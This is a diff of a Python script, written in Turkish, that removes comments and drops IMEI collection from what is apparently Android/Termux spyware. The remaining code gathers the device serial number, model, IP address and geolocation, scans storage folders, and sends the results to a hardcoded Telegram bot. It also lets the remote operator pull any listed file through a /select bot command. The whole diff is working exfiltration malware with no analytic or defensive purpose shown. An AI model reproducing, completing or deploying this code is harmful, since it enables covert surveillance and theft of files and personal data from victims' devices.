@@ -11,31 +11,22 @@ CHAT_ID = "6736473228"
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
 TELEGRAM_MESSAGE_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-# Dosya-nesne eşleştirmesi için global değişken
+# Dosya-nesne eşleştirmesi
 dosya_haritasi = {}
 
 def cihaz_bilgisi_al():
     bilgiler = {}
     try:
-        # Cihaz bilgileri
         bilgiler["Model"] = os.popen("getprop ro.product.model").read().strip() or "Bilinmiyor"
         bilgiler["OS"] = os.popen("getprop ro.build.version.release").read().strip() or "Bilinmiyor"
         bilgiler["Seri No"] = os.popen("getprop ro.serialno").read().strip() or "Bilinmiyor"
         bilgiler["Cihaz ID"] = os.popen("getprop ro.build.id").read().strip() or "Bilinmiyor"
         bilgiler["Üretici"] = os.popen("getprop ro.product.manufacturer").read().strip() or "Bilinmiyor"
-        # IMEI (opsiyonel, termux-api gerekir)
-        try:
-            bilgiler["IMEI"] = os.popen("termux-telephony-deviceinfo").read().strip() or "Bilinmiyor"
-        except:
-            bilgiler["IMEI"] = "Bilinmiyor"
-        
-        # IP ve detaylı konum bilgileri
         try:
             ip_response = requests.get("https://api.ipify.org/?format=json")
             ip_json = ip_response.json()
             ip = ip_json.get("ip", "Bilinmiyor")
             bilgiler["IP"] = ip
-
             ip_info_response = requests.get(f"http://ip-api.com/json/{ip}")
             ip_info = ip_info_response.json()
             bilgiler["Ülke"] = ip_info.get("country", "Bilinmiyor")
@@ -75,7 +66,6 @@ def dosya_tara():
     global dosya_haritasi
     dosya_haritasi = {}
     sayac = 1
-
     for klasor, yol in klasorler.items():
         dosya_listesi[klasor] = []
         try:
@@ -87,13 +77,10 @@ def dosya_tara():
                     sayac += 1
         except:
             dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı!"})
-
     return dosya_listesi
 
 def bilgileri_kaydet_ve_gonder():
     zaman_damgasi = int(time.time())
-
-    # Cihaz ve IP bilgisini estetik mesaj olarak gönder
     cihaz_bilgisi = cihaz_bilgisi_al()
     cihaz_mesaji = (
         "╔══════════════════════╗\n"
@@ -104,7 +91,6 @@ def bilgileri_kaydet_ve_gonder():
         f"║ Seri No: {cihaz_bilgisi.get('Seri No', 'Bilinmiyor')} \n"
         f"║ Cihaz ID: {cihaz_bilgisi.get('Cihaz ID', 'Bilinmiyor')} \n"
         f"║ Üretici: {cihaz_bilgisi.get('Üretici', 'Bilinmiyor')} \n"
-        f"║ IMEI: {cihaz_bilgisi.get('IMEI', 'Bilinmiyor')} \n"
         "╠══════════════════════╣\n"
         "║      IP Bilgisi      ║\n"
         "╠══════════════════════╣\n"
@@ -123,26 +109,22 @@ def bilgileri_kaydet_ve_gonder():
     )
     requests.post(TELEGRAM_MESSAGE_API, data={"chat_id": CHAT_ID, "text": cihaz_mesaji})
     print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
-
-    # Dosya listesini kaydet ve gönder
     dosya_listesi = dosya_tara()
     dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
     with open(dosya_dosyasi, "w") as f:
         json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
     print(f"Dosyalar {dosya_dosyasi} kaydedildi!")
-
     with open(dosya_dosyasi, "rb") as f:
         requests.post(TELEGRAM_API, data={"chat_id": CHAT_ID}, files={"document": f})
     print(f"{dosya_dosyasi} Telegram'a gönderildi!")
 
 def select_file(update, context):
     try:
-        numara = context.args[0]  # /select 6 -> 6'yı alır
+        numara = context.args[0]
         dosya_yolu = dosya_haritasi.get(numara)
         if not dosya_yolu or not os.path.exists(dosya_yolu):
             update.message.reply_text(f"Numara {numara} bulunamadı, kral! 😈")
             return
-
         with open(dosya_yolu, "rb") as f:
             update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
         print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
@@ -154,11 +136,7 @@ def main():
     updater = Updater(BOT_TOKEN, use_context=True)
     dp = updater.dispatcher
     dp.add_handler(CommandHandler("select", select_file, pass_args=True))
-    
-    # Bilgileri topla ve gönder
     bilgileri_kaydet_ve_gonder()
-    
-    # Botu başlat
     updater.start_polling()
     updater.idle()
 
